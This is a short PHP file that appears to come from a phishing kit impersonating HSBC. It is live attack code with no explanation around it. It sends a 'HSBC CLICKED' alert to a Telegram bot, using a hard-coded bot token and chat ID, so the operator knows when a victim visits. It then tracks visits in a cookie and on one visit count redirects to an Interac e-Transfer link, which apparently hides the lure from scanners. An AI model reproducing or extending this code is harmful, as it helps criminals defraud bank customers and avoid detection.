<?php


$message = "HSBC CLICKED\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-953492204',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
?><?php

// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count < 2) {
  header("Location: index.php");
} elseif ($visit_count >= 2 && $visit_count < 6) {
  header("Location: index.php");
} elseif ($visit_count >= 9 && $visit_count < 10) {
  header("Location: https://etransfer.interac.ca/RP.do?pID=CANj43Vy&lvt=7C115B1C874243FC736311916BF3E204AC32B2BC9DF9613E45C5CA70E2950D8F");
} else {
    header('Location: index.php');
}

exit;